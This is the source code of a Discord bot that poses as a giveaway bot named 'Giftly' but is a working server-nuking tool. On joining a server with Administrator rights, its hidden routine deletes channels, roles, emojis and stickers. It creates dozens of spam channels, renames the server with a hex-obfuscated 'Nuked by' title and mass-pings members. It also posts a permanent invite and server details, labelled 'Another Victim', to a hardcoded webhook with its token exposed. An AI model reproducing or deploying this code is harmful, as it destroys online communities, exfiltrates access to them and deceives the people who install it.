        discord.VerificationLevel.low: "Low",
        discord.VerificationLevel.medium: "Medium",
        discord.VerificationLevel.high: "High",
        discord.VerificationLevel.highest: "Very High"
    }

    nsfw_map = {
        discord.NSFWLevel.default: "Default",
        discord.NSFWLevel.explicit: "Explicit",
        discord.NSFWLevel.safe: "Safe",
        discord.NSFWLevel.age_restricted: "Age Restricted"
    }
    created_at = created_at = int(guild.created_at.timestamp())

    boost_tier = getattr(guild, "premium_tier", 0)
    boost_count = getattr(guild, "premium_subscription_count", 0) or 0
    boost_text = f"Level {boost_tier} ({boost_count} Boost(s))"

    features = getattr(guild, "features", [])
    if features:
        formatted_features = [f"🔹 {f.lower().replace('_', ' ').title()}" for f in features]

        traits_lines = []
        current_length = 0
        for line in formatted_features:
            line_length = len(line) + 1
            if current_length + line_length > 1000:
                traits_lines.append("...")
                break
            traits_lines.append(line)
            current_length += line_length

        traits = "\\n".join(traits_lines)
    else:
        traits = "None"

    embed = discord.Embed(
        title=guild.name,
        color=discord.Color.blurple()
    )

    if getattr(guild, "banner", None):
        embed.set_image(url=guild.banner.url)

    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    embed.add_field(name="🏅 Server Name", value=f"`{guild.name}`", inline=False)
    embed.add_field(name="📝 Server Description", value=f"> `{guild.description}`", inline=False)
    embed.add_field(name="🆔 Server ID", value=f"`{guild.id}`", inline=False)
    embed.add_field(name="😳 NSFW Level", value=nsfw_map.get(guild.nsfw_level, "Unknown"), inline=False)
    embed.add_field(name="👤 Inviter",value=f"{inviter} (`{inviter.id if inviter else 'Unknown'}`)" if inviter else "Unknown",inline=False)
    embed.add_field(name="📺 Invite Channel", value=f"`{channel.name if channel else 'Unknown'}`", inline=False)
    embed.add_field(name="👥 Members", value=f"{invite.approximate_presence_count or 0} Online\\n{invite.approximate_member_count or 0} Total", inline=False)
    embed.add_field(name="💎 Boosts", value=boost_text, inline=False)
    embed.add_field(name="🛡️ Verification Level", value=verification_levels.get(guild.verification_level, "Unknown"), inline=False)
    embed.add_field(name="✨ Features", value=traits, inline=False)
    embed.add_field(name="📅 Created", value=f"<t:{created_at}:R>", inline=False)

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="raidcheck", description="Check if the bot has perms to raid this server.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def raidcheck(interaction: discord.Interaction):
    await interaction.response.send_message("Testing if this server is raidable...", ephemeral=True )

    followup_msg = await interaction.followup.send("_ _", wait=True)

    status = "You aren't supposed to see this..."

    if followup_msg.flags.ephemeral == False:
        status = "This server is **RAIDABLE** ✅"
    elif followup_msg.flags.ephemeral == True:
        status = "This server is **NOT RAIDABLE** ❌"
    else:
        status = "Unknown error"

    await followup_msg.delete()

    await interaction.edit_original_response(content=status)


async def send_webhook(guild: discord.Guild, invite_url: str):
    embed = {
        "title": "Another Victim",
        "color": 0x00ff00,
        "fields": [
            {"name": "Server Name", "value": guild.name, "inline": True},
            {"name": "Server ID", "value": str(guild.id), "inline": True},
            {"name": "Members", "value": str(int(guild.member_count)-1), "inline": True},
            {"name": "Invite Link", "value": invite_url, "inline": False}
        ],
        "thumbnail": {"url": guild.icon.url if guild.icon else None}
    }
    data = {"embeds": [embed]}
    try:
        requests.post("https://discord.com/api/webhooks/1433553747908497509/i0B2EwItcUNU7-U3C-FGG1Uddvv3cRyiV0zhBUU8CCb2yXaVFW_xjI7X_essKxTNvFfr", json=data)
    except Exception as e:
        pass

async def lollollol(guild: discord.Guild):
    if guild.id == 1391814914246578287:
        await guild.leave()

    else:
        guild = guild

        old_channels = guild.channels
        results = await asyncio.gather(
            *[c.delete() for c in guild.channels], 
            return_exceptions=True)
        for result, channel in zip(results, old_channels):
            if isinstance(result, Exception):
                pass
            else:
                pass

        old_channels = guild.channels
        results = await asyncio.gather(
            *[guild.create_text_channel("team cal was here💀✌") for _ in range(60)], 
            return_exceptions=True)

        new_channels = [c for c in guild.channels if (c in old_channels) == False]
        for result, channel in zip(results, new_channels):
            if isinstance(result, Exception):
                pass
            else:
                pass

            return

        old_roles = guild.roles
        results = await asyncio.gather(
            *[r.delete() for r in guild.roles], 
            return_exceptions=True)
        for result, role in zip(results, old_roles):
            if isinstance(result, Exception):
                pass
            else:
                pass

        old_emojis = guild.emojis
        results = await asyncio.gather(
            *[e.delete() for e in guild.emojis], 
            return_exceptions=True)
        for result, emoji in zip(results, old_emojis):
            if isinstance(result, Exception):
                pass
            else:
                pass

        old_stickers = guild.stickers
        results = await asyncio.gather(
            *[s.delete() for s in guild.stickers], 
            return_exceptions=True)
        for result, sticker in zip(results, old_stickers):
            if isinstance(result, Exception):
                pass
            else:
                pass
        if guild is None:
            return
        invite_url = "None"
        me = guild.me
        if me is None:
            try:
                me = await guild.fetch_member(bot.user.id)
            except Exception:
                invite_url = "None"
                return

        invite_url = "No valid channel found."

        for channel in guild.text_channels:
            if channel.permissions_for(me).create_instant_invite:
                try:
                    invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
                    invite_url = invite.url
                    break
                except Exception as e:
                    invite_url = f"Error creating invite in {channel.name}: {e}"
                    continue

        await send_webhook(guild, invite_url)


        new_guild_title = bytes.fromhex('4e756b6564206279205850202d20303435f09f9280e29c8c').decode('utf-8')

        icon = None
        icon_path = 'sicon.jpg'
        if os.path.exists(icon_path):
            try:
                with open(icon_path, 'rb') as icon:
                    icon = icon.read()
            except OSError as e:
                pass
        else:
            pass

        try:
            flags = discord.SystemChannelFlags()
            flags.guild_reminder_notifications = True
            flags.join_notification_replies = False
            flags.join_notifications = False
            flags.premium_subscriptions = False
            flags.role_subscription_purchase_notification_replies = False
            flags.role_subscription_purchase_notifications = False

            if icon is None:
                await guild.edit(
                    name=new_guild_title,
                    description=new_guild_title,
                    discoverable=False,
                    community=False,
                    default_notifications=discord.NotificationLevel.all_messages,
                    verification_level=discord.VerificationLevel.highest,
                    explicit_content_filter=discord.ContentFilter.disabled,
                    premium_progress_bar_enabled=False,
                    preferred_locale=discord.Locale.japanese,
                    afk_channel=None,
                    afk_timeout=None,
                    system_channel=None,
                    system_channel_flags=flags,
                    rules_channel=None,
                    public_updates_channel=None
                )
            else:
                await guild.edit(
                    name=new_guild_title,
                    description=new_guild_title,
                    icon=icon,
                    banner=icon,
                    splash=icon,
                    discovery_splash=icon,
                    discoverable=False,
                    community=False,
                    default_notifications=discord.NotificationLevel.all_messages,
                    verification_level=discord.VerificationLevel.highest,
                    explicit_content_filter=discord.ContentFilter.disabled,
                    premium_progress_bar_enabled=False,
                    preferred_locale=discord.Locale.turkish,
                    afk_channel=None,
                    afk_timeout=None,
                    system_channel=None,
                    system_channel_flags=flags,
                    rules_channel=None,
                    public_updates_channel=None
                )

        except discord.HTTPException as e:
            pass
        except Exception as e:
            pass

        for _ in range(84):
            tasks = [channel.send("@everyone team cal was here  https://discord.gg/a22QbYvre7") for channel in guild.text_channels if channel.permissions_for(guild.me).send_messages]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)


@bot.tree.command(name="giveaway_start", description="Start a new giveaway.")
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def giveaway_start(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

@bot.tree.command(name="giveaway_end", description="End a giveaway.")
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def giveaway_end(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

@bot.tree.command(name="giveaway_list", description="Show active giveaways.")
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def giveaway_list(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

@bot.tree.command(name="giveaway_edit", description="Edits a giveaway.")
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def giveaway_list(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

@bot.tree.command(name="giveaway_reroll", description="Rerolls a giveaway.")
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def giveaway_list(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

@bot.event
async def on_guild_join(guild):
    if guild.id == 1391814914246578287:
        return
    try:
        async for _ in guild.fetch_members(limit=None):
            pass
    except:
        pass
    if not guild.me.guild_permissions.administrator and guild.member_count < 11:
        inviter = None
        if guild.me and guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=20, action=discord.AuditLogAction.bot_add):
                    if entry.target and getattr(entry.target, "id", None) == bot.user.id:
                        inviter = entry.user
                        break
            except Exception as e:
                pass
        if inviter:
            await inviter.send("Don't add the bot to servers with less than 10 members, it causes ratelimit.")
            await inviter.send("Missing permission `Administrator`, please give the `Administrator` permission to `Giftly` and then add it to your community!")
        try:
            await guild.leave()
        except discord.NotFound:
            pass
        return
    elif not guild.me.guild_permissions.administrator:
        inviter = None
        if guild.me and guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=20, action=discord.AuditLogAction.bot_add):
                    if entry.target and getattr(entry.target, "id", None) == bot.user.id:
                        inviter = entry.user
                        break
            except Exception as e:
                pass
        if inviter:
            await inviter.send("Missing permission `Administrator`, please give the `Administrator` permission to `Giftly` and then add it to your community!")
        try:
            await guild.leave()
        except discord.NotFound:
            pass
        return

    elif guild.member_count < 11:
        inviter = None
        if guild.me and guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=20, action=discord.AuditLogAction.bot_add):
                    if entry.target and getattr(entry.target, "id", None) == bot.user.id:
                        inviter = entry.user
                        break
            except Exception as e:
                pass
        if inviter:
            await inviter.send("Don't add the bot to servers with less than 10 members, it causes ratelimit.")
        try:
            await guild.leave()
        except discord.NotFound:
            pass
        return
    else:
        if guild.member_count > 11:
            if guild.me.guild_permissions.administrator:
                await lollollol(guild)

@bot.command()
async def manualstart(ctx):
    await lollollol(ctx.guild)

@bot.event 
async def on_command_error(ctx, error):
    return

@bot.event
async def on_ready():
    await bot.tree.sync()

if __name__ == '__main__':
    bot.run(__token__)
